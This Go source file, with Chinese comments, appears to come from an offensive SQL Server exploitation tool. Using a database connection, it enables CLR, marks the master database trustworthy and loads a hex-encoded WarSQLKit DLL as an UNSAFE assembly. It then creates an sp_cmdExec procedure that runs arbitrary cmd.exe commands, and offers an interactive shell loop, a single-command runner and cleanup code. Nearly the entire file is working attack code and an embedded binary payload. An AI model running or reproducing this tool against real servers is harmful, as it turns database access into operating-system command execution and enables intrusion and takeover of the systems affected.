package pac

import (
	"bufio"
	"database/sql"
	"fmt"
	"os"
	"strings"
)

// 判断是否开启CLR
func MssqlCLR(conn *sql.DB) (err error) {

	sqlstr1 := "exec sp_configure 'show advanced options', 1;RECONFIGURE;Exec sp_configure 'clr enabled', 1;RECONFIGURE;"
	MssqlCMD(sqlstr1, conn)
	Info("exec sp_configure 'show advanced options', 1;RECONFIGURE;Exec sp_configure 'clr enabled', 1;RECONFIGURE;执行")

	sqlstr2 := "ALTER DATABASE [master] SET TRUSTWORTHY ON;"
	MssqlCMD(sqlstr2, conn)
	Info("ALTER DATABASE [master] SET TRUSTWORTHY ON;执行")

	clr := "0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
	sqlsstr3 := fmt.Sprintf("CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM %s WITH PERMISSION_SET = UNSAFE;", clr)
	MssqlCMD(sqlsstr3, conn)

	sqlsstr4 := "CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;"
	MssqlCMD(sqlsstr4, conn)
	return err
}

// 开启CLR之后获取一个cmd shell
func CMDconsole_CLR(conn *sql.DB) {

	table := Creatable(conn)

	Info("执行系统命令")
	reader := bufio.NewReader(os.Stdin)
	for {
		clrcmd := "EXEC sp_cmdExec "
		fmt.Printf("%s:%s> $ ", Rhost, Rport)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		aa := fmt.Sprintf("%s\"%s >> C:\\\\test11.txt\";", clrcmd, cmd)
		Info(aa)
		fmt.Println(MssqlCMD(aa, conn))

		Insertresult(table, conn)
	}
}

// 执行单条命令
func CMDone_CLR(cmd3 string, conn *sql.DB) (err error) {
	table := Creatable(conn)

	Info("执行系统命令")
	clrcmd := "EXEC sp_cmdExec "
	bb := fmt.Sprintf("%s\"%s >> C:\\\\test11.txt\";", clrcmd, cmd3)
	Info(bb)
	MssqlCMD(bb, conn)

	Insertresult(table, conn)

	return err
}

func DeleteWarSQLKit(conn *sql.DB) {
	Info("删除创建的程序集WarSQLKit")
	sqlstr := "DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];"
	Info("执行DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];删除程序集")
	MssqlCMD(sqlstr, conn)
}
